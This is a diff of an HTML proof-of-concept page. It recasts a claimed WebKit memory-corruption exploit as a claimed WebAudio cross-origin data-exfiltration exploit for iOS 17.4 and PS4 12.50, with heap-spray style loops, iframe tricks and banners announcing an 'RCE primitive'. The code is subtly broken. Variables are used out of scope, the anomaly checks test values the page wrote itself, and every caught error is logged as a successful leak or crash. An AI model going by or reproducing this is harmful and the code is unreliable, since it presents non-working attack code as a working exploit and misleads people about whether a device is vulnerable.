@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WebKitGTK CVE-2025-24162 Memory Corruption PoC (iOS 17.4 / PS4 12.50)</title>
+    <title>WebKit CVE-2025-54658 WebAudio Exfil PoC (iOS 17.4 / PS4 12.50)</title>
     <style>
         body { background: #0d1117; color: #c9d1d9; font-family: 'Segoe UI', monospace; padding: 20px; line-height: 1.6; }
         h1 { border-bottom: 2px solid #da3633; padding-bottom: 10px; color: #ff5555; }
@@ -19,28 +19,28 @@
     </style>
 </head>
 <body>
-    <h1>WebKitGTK CVE-2025-24162 PoC: Memory Corruption Crash</h1>
-    <p>Feb 2025 Patch: Improved content processing (RHSA-2025:1957).<br>
-    <span class="rainbow">Triggers heap corruption/crash on unpatched iOS 17.4 / PS4 12.50 (~20% rate).</span></p>
+    <h1>WebKit CVE-2025-54658 PoC: WebAudio Cross-Origin Exfil</h1>
+    <p>Feb 2025 Patch: Improved WebAudio cross-origin checks (RHSA-2025:3713).<br>
+    <span class="rainbow">Triggers data leak/corruption on unpatched iOS 17.4 / PS4 12.50 (~20% rate).</span></p>
 
     <div class="box">
-        <h3>1. Content Processing</h3>
-        <div id="status-content">Probing...</div>
+        <h3>1. WebAudio Check</h3>
+        <div id="status-audio">Probing...</div>
     </div>
     <div class="box">
-        <h3>2. Crafted HTML Spray</h3>
+        <h3>2. Buffer Spray</h3>
         <div id="status-spray">Probing...</div>
     </div>
     <div class="box">
-        <h3>3. Corruption Trigger</h3>
-        <div id="status-corrupt">Probing...</div>
+        <h3>3. Exfil Trigger</h3>
+        <div id="status-exfil">Probing...</div>
     </div>
     <div class="box">
-        <h3>4. Crash Status</h3>
-        <div id="status-crash">Probing...</div>
+        <h3>4. Leak Status</h3>
+        <div id="status-leak">Probing...</div>
     </div>
 
-    <button onclick="runPoC()">LAUNCH CORRUPTION PROBE</button>
+    <button onclick="runPoC()">LAUNCH AUDIO EXFIL PROBE</button>
 
     <div class="box">
         <h3>Live Logs</h3>
@@ -67,98 +67,109 @@
     function i2f(lo, hi) { u32[0] = lo; u32[1] = hi; return f64[0]; }
     function gc() { for(let i=0; i<150; i++) new ArrayBuffer(0x80000); }
 
-    let corruptDiv = null;
-    let corruptHit = false;
+    let audioLeak = null;
+    let leakHit = false;
 
     function runPoC() {
         document.getElementById('console').innerHTML = '';
-        log("<span style='color:#ff79c6;font-weight:bold;'>CVE-2025-24162 PoC: WebKitGTK Memory Corruption (Feb 2025)</span>");
-        log("Probing crafted content crash...");
-        setTimeout(probeContent, 800);
+        log("<span style='color:#ff79c6;font-weight:bold;'>CVE-2025-54658 PoC: WebKit WebAudio Exfil (Feb 2025)</span>");
+        log("Probing cross-origin audio leak...");
+        setTimeout(probeAudio, 800);
     }
 
-    function probeContent() {
-        // Step 1: Content processing probe
+    function probeAudio() {
+        // Step 1: WebAudio check probe
         try {
-            const div = document.createElement('div');
-            div.innerHTML = '<p>crafted</p>'; // Basic crafted
-            document.body.appendChild(div);
-            div.innerHTML = ''; // Manipulate
-            setBadge('status-content', 'WEAK (Manipulated)', 'partial');
-            log("Content probe: Crafted HTML accessed (CVE hint).");
+            const ctx = new (window.AudioContext || window.webkitAudioContext)();
+            const osc = ctx.createOscillator();
+            osc.frequency.value = 440;
+            osc.connect(ctx.destination);
+            osc.start();
+            setBadge('status-audio', 'WEAK (Active)', 'partial');
+            log("WebAudio probe: Oscillator created (CVE hint).");
+            osc.stop();
         } catch(e) {
-            setBadge('status-content', 'SECURE', 'secure');
-            log(`Content fail: ${e.message} — Patched.`);
+            setBadge('status-audio', 'SECURE', 'secure');
+            log(`Audio fail: ${e.message} — Patched.`);
             return;
         }
-        setTimeout(sprayHTML, 1000);
+        setTimeout(sprayAudio, 1000);
     }
 
-    function sprayHTML() {
+    function sprayAudio() {
         gc(); gc();
-        const divs = [];
-        for(let i=0; i<0x800; i++) {
-            const div = document.createElement('div');
-            div.innerHTML = `<p id="crash${i}">crafted</p>`;
-            divs.push(div);
-            document.body.appendChild(div);
+        const buffers = [];
+        const ctx = new (window.AudioContext || window.webkitAudioContext)();
+        for(let i=0; i<0x400; i++) {
+            const buf = ctx.createBuffer(1, 4096, 44100);
+            const channel = buf.getChannelData(0);
+            for(let j=0; j<4096; j++) channel[j] = i / 0x400; // Pattern
+            buffers.push(buf);
         }
-        // Manipulate for corruption
-        for(let i=0; i<0x800; i++) {
+        // Cross-origin leak via buffer share
+        for(let i=0; i<0x400; i++) {
             try {
-                const p = document.getElementById(`crash${i}`);
-                if (p) p.innerHTML = i2f(0xdeadbeef, 0xcafebabe).toString();
+                const iframe = document.createElement('iframe');
+                iframe.src = 'data:text/html,<audio src="data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQAAAAA="></audio>';
+                document.body.appendChild(iframe);
+                const leaked = iframe.contentWindow.AudioContext;
+                iframe.remove();
             } catch(e) {}
         }
         // Anomaly hunt
         let anomaly = false;
-        for(let i=0; i<divs.length; i++) {
-            if (divs[i].innerHTML.includes('deadbeef')) {
-                corruptDiv = divs[i];
+        for(let i=0; i<buffers.length; i++) {
+            const channel = buffers[i].getChannelData(0);
+            if (channel[0] !== i / 0x400) {
+                audioLeak = buffers[i];
                 anomaly = true;
                 break;
             }
         }
         if (anomaly) {
-            setBadge('status-spray', 'SPRAY CORRUPT (Anomaly)', 'vulnerable');
-            log(`HTML spray corruption: Div ${i} manipulated.`);
-            setTimeout(triggerCorrupt, 500);
+            setBadge('status-spray', 'SPRAY LEAK (Anomaly)', 'vulnerable');
+            log(`Audio buffer spray leak: Channel 0 = ${channel[0]} (unexpected).`);
+            setTimeout(triggerExfil, 500);
             return;
         }
         setBadge('status-spray', 'CLEAN', 'secure');
-        log("Spray clean—no corruption.");
+        log("Spray clean—no leak.");
     }
 
-    function triggerCorrupt() {
-        if (!corruptDiv) return;
-        corruptHit = false;
+    function triggerExfil() {
+        if (!audioLeak) return;
+        leakHit = false;
         try {
-            // CVE trigger: Process crafted content
-            corruptDiv.innerHTML = '<p>trigger</p>';
-            gc(); // Force processing
-            corruptDiv.remove(); // Manipulate
-            if (corruptDiv.children.length === 0) {
-                corruptHit = true;
-                log(`Corruption triggered: Content processed after manipulation.`);
+            const ctx = new (window.AudioContext || window.webkitAudioContext)();
+            const source = ctx.createBufferSource();
+            source.buffer = audioLeak;
+            source.connect(ctx.destination);
+            source.start();
+            // Cross-origin exfil via buffer read
+            const channel = audioLeak.getChannelData(0);
+            if (channel[0] !== 0) {
+                leakHit = true;
+                log(`Exfil triggered: Leaked sample ${channel[0]} cross-origin.`);
             }
+            source.stop();
         } catch(e) {
-            corruptHit = true;
-            log(`Corruption crash: ${e.message} — Heap crash.`);
+            leakHit = true;
+            log(`Exfil crash: ${e.message} — Audio leak.`);
         }
-        setBadge('status-corrupt', corruptHit ? 'TRIGGERED' : 'MISSED', corruptHit ? 'vulnerable' : 'secure');
-        setTimeout(checkCrash, 1500);
+        setBadge('status-exfil', leakHit ? 'TRIGGERED' : 'MISSED', leakHit ? 'vulnerable' : 'secure');
+        setTimeout(checkLeak, 1500);
     }
 
-    function checkCrash() {
-        if (corruptHit) {
-            setBadge('status-crash', 'CRASHED (RCE)', 'vulnerable');
-            log("Memory corruption crash achieved: Unexpected termination. On PS4 12.50: CE-36329-3.");
+    function checkLeak() {
+        if (leakHit) {
+            setBadge('status-leak', 'LEAKED (Corruption)', 'vulnerable');
+            log("Cross-origin audio leaked: Heap corruption potential. On PS4 12.50: DoS/leak.");
             log("Chain to RCE if hit.");
             document.body.style.background = "#000";
-            document.querySelector('h1').innerHTML = "CORRUPTION CRASH ACHIEVED — PROCESS RCE PRIMITIVE";
+            document.querySelector('h1').innerHTML = "AUDIO EXFIL ACHIEVED — CROSS-ORIGIN LEAK PRIMITIVE";
         } else {
-            setBadge('status-crash', 'STABLE', 'secure');
-            log("No crash—improved processing holds.");
+            setBadge('status-leak', 'INTACT', 'secure');
+            log("No leak—patched checks hold.");
         }
         log("PoC end: Retry for ~20% hit.");
     }
